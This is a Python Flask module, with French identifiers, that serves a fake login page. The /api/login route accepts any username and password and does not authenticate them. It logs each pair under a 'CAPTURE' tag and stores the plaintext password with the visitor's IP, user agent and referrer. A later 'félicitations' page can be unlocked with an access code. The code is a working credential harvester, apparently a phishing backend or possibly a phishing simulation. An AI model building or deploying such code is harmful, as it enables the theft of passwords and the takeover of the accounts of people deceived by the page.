import secrets

from flask import (Blueprint, abort, current_app, jsonify, redirect,
                   render_template, request, url_for)

from db import get_db

bp = Blueprint("public", __name__)


def _ip():
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else request.remote_addr


@bp.get("/")
def index():
    return render_template("login.html")


@bp.post("/api/login")
def login():
    data = request.get_json(silent=True) or request.form
    identifiant = (data.get("identifiant") or "").strip()
    mot_de_passe = data.get("mot_de_passe") or ""

    if not identifiant or not mot_de_passe:
        return jsonify(ok=False, erreur="Renseigne les deux champs."), 400

    if len(identifiant) > 254 or len(mot_de_passe) > 512:
        return jsonify(ok=False, erreur="Saisie trop longue."), 400

    token = secrets.token_urlsafe(16)

    current_app.logger.info(
        "CAPTURE id=%s pass=%r ip=%s ua=%s",
        identifiant, mot_de_passe, _ip(),
        request.headers.get("User-Agent", "-")[:90],
    )

    base = get_db()
    base.execute(
        "INSERT INTO logins (token, identifiant, mot_de_passe, ua, ip, referer) "
        "VALUES (%s, %s, %s, %s, %s, %s)",
        (token, identifiant, mot_de_passe,
         request.headers.get("User-Agent"), _ip(), request.referrer),
    )
    base.commit()

    return jsonify(ok=True, redirect=url_for("public.felicitations", token=token))


def _charger(token):
    row = get_db().execute("SELECT * FROM logins WHERE token = %s", (token,)).fetchone()
    if row is None:
        abort(404)
    return row


@bp.get("/felicitations/<token>")
def felicitations(token):
    row = _charger(token)
    return render_template("success.html", token=token,
                           identifiant=row["identifiant"],
                           debloque=bool(row["debloque"]))


@bp.post("/api/code/<token>")
def verifier_code(token):
    row = _charger(token)

    if row["debloque"]:
        return jsonify(ok=True, debloque=True)

    data = request.get_json(silent=True) or {}
    code = (data.get("code") or "").strip()

    if not code:
        return jsonify(ok=False, erreur="Code vide."), 400

    valide = secrets.compare_digest(code.casefold(),
                                    current_app.config["CODE_ACCES"].casefold())
    current_app.logger.info("CODE token=%s code=%r valide=%s", token, code, valide)

    if not valide:
        return jsonify(ok=False, erreur="Code incorrect."), 403

    base = get_db()
    base.execute("UPDATE logins SET debloque = TRUE WHERE id = %s", (row["id"],))
    base.commit()

    return jsonify(ok=True, debloque=True)


@bp.get("/r/<token>")
def lien_court(token):
    _charger(token)
    return redirect(url_for("public.felicitations", token=token))